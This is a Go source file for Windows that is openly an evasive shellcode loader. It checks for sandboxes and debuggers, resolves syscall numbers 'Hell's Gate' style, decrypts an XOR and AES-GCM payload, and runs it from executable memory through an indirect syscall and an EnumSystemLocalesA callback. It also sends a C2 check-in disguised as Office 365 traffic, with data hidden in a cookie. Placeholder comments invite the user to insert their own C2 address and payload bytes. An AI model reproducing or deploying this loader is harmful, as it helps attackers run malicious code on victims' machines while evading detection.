//go:build windows
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// indirectSyscall links to the ASM stub
// Ensure your .s file matches this signature
func indirectSyscall(ssn uint16, syscallAddr uintptr, handle uintptr, addr *uintptr, zeroBits uintptr, size *uintptr, allocType uintptr, protect uintptr) uintptr

var (
	k32 = syscall.NewLazyDLL("kernel32.dll")
	nt  = syscall.NewLazyDLL("ntdll.dll")

	vProtect      = k32.NewProc("VirtualProtect")
	rtlMoveMemory = nt.NewProc("RtlMoveMemory")
	enumLocales   = k32.NewProc("EnumSystemLocalesA")
)

// checkEnvironment performs basic sandbox evasion
func checkEnvironment() {
	if runtime.NumCPU() < 2 {
		os.Exit(0)
	}
	start := time.Now()
	time.Sleep(100 * time.Millisecond)
	if time.Since(start) < 100*time.Millisecond {
		os.Exit(0)
	}
	isDebugger := k32.NewProc("IsDebuggerPresent")
	if res, _, _ := isDebugger.Call(); res != 0 {
		os.Exit(0)
	}
}

// resolveSyscall implements "Hell's Gate" logic
func resolveSyscall(proc *syscall.LazyProc) (uint16, uintptr, error) {
	ptr := proc.Addr()
	if ptr == 0 {
		return 0, 0, errors.New("could not resolve proc address")
	}

	ssn := *(*uint16)(unsafe.Pointer(ptr + 4))

	var syscallAddr uintptr
	for i := 0; i < 32; i++ {
		b1 := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		b2 := *(*byte)(unsafe.Pointer(ptr + uintptr(i+1)))
		if b1 == 0x0F && b2 == 0x05 {
			syscallAddr = ptr + uintptr(i)
			break
		}
	}

	if syscallAddr == 0 {
		return 0, 0, errors.New("syscall instruction not found")
	}

	return ssn, syscallAddr, nil
}

// unpack handles AES-256-GCM and XOR de-obfuscation
func unpack(data []byte, aesKey []byte, xorKey byte) ([]byte, error) {
	if len(aesKey) != 32 {
		return nil, errors.New("invalid AES key length")
	}
	for i := range data {
		data[i] ^= xorKey
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, errors.New("payload too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// smuggleBeacon sends a check-in disguised as O365 traffic
func smuggleBeacon(url string, metadata string) {
	// Add random jitter to break timing analysis
	jitter := time.Duration(rand.Intn(2000)+1000) * time.Millisecond
	time.Sleep(jitter)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}

	// Malleable Profile Headers
	encodedMeta := base64.StdEncoding.EncodeToString([]byte(metadata))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Referer", "https://outlook.office365.com/")
	
	// Smuggling payload in a common session cookie
	req.Header.Set("Cookie", fmt.Sprintf("X-OWA-CANARY=%s; OutlookSession=%s", encodedMeta, "5f2a1b9e"))

	resp, err := client.Do(req)
	if err == nil {
		resp.Body.Close()
	}
}

func main() {
	// 1. Evasion: Sandbox & Debugger check
	checkEnvironment()

	// 2. Network Obfuscation: Initial check-in
	// Replace with your C2 or listener address
	smuggleBeacon("https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "STG_1_COMPLETE")

	// 3. Preparation: Unpack shellcode
	packedPayload := []byte{ /* INSERT YOUR PACKED BYTES HERE */ }
	aesKey := []byte("32-byte-key-for-aes-256-standard") // Must be 32 bytes
	xorKey := byte(0xFF)

	if len(packedPayload) == 0 {
		return
	}

	decrypted, err := unpack(packedPayload, aesKey, xorKey)
	if err != nil || len(decrypted) == 0 {
		return
	}

	// 4. Hell's Gate: Dynamic SSN Resolution
	ntAlloc := nt.NewProc("NtAllocateVirtualMemory")
	ssn, syscallInst, err := resolveSyscall(ntAlloc)
	if err != nil {
		return
	}

	// 5. Execution: Indirect Syscall & Callback
	var baseAddress uintptr
	size := uintptr(len(decrypted))

	// Current Process handle is -1 (0xffffffffffffffff)
	status := indirectSyscall(ssn, syscallInst, uintptr(0xffffffffffffffff), &baseAddress, 0, &size, 0x3000, 0x04)
	if status != 0 {
		return
	}

	_, _, _ = rtlMoveMemory.Call(baseAddress, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))

	var oldProtect uint32
	// PAGE_EXECUTE_READ = 0x20
	if ret, _, _ := vProtect.Call(baseAddress, uintptr(len(decrypted)), 0x20, uintptr(unsafe.Pointer(&oldProtect))); ret == 0 {
		return
	}

	// Use EnumSystemLocalesA to trigger the shellcode entry point
	_, _, _ = enumLocales.Call(baseAddress, 0)
}
